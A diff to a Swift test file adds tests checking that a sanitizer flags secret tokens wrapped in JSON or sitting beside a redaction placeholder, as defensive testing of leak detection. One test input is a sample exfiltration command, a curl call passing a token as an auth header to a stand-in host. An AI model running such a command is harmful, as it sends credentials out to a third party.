@@ -147,6 +147,32 @@ struct LLMSanitizerStrictModeTests {
         #expect(LLMSanitizer.hasResidualSensitiveContent("ya29.A0ARrdaMxKp9QwErTy7uIoP3aSdFgHjKlZxCvBnM") == true)
     }
 
+    // The detector split only on whitespace and trimmed punctuation at the
+    // OUTER boundary, so a secret wrapped in ordinary JSON stayed one candidate
+    // whose internal quotes and colons failed the token-charset test -- it was
+    // skipped rather than examined. Alert context reaches the sanitizer as
+    // compact JSON, which is exactly this shape.
+    @Test("flags a secret wrapped in JSON framing, not just a bare token")
+    func flagsStructuredFraming() {
+        let token = "Ab3Xk9Qz7Lm2Pw5Rt8Yn1Dv4Fg6Hj0Kc"
+        #expect(LLMSanitizer.hasResidualSensitiveContent(token) == true,
+                "bare token is the control")
+        #expect(LLMSanitizer.hasResidualSensitiveContent("{\"opaque\":\"\(token)\"}") == true)
+        #expect(LLMSanitizer.hasResidualSensitiveContent("{\"api_key\":\"\(token)\"}") == true)
+        #expect(LLMSanitizer.hasResidualSensitiveContent(
+            "{\"rule\":\"exfil\",\"cmd\":\"curl -H auth:\(token) https://x\"}") == true)
+        #expect(LLMSanitizer.hasResidualSensitiveContent("[\"\(token)\"]") == true)
+    }
+
+    // A candidate containing the substring REDACTED is exempted, so a real
+    // secret adjacent to a placeholder must still be split out and caught.
+    @Test("a placeholder next to a live secret does not launder it")
+    func placeholderDoesNotExempt() {
+        let token = "Ab3Xk9Qz7Lm2Pw5Rt8Yn1Dv4Fg6Hj0Kc"
+        #expect(LLMSanitizer.hasResidualSensitiveContent("[REDACTED] \(token)") == true)
+        #expect(LLMSanitizer.hasResidualSensitiveContent("{\"a\":\"[REDACTED]\",\"b\":\"\(token)\"}") == true)
+    }
+
     @Test("does NOT flag ordinary prose, paths, or already-redacted text")
     func ignoresBenign() {
         #expect(LLMSanitizer.hasResidualSensitiveContent("The process curl downloaded a file then executed it.") == false)
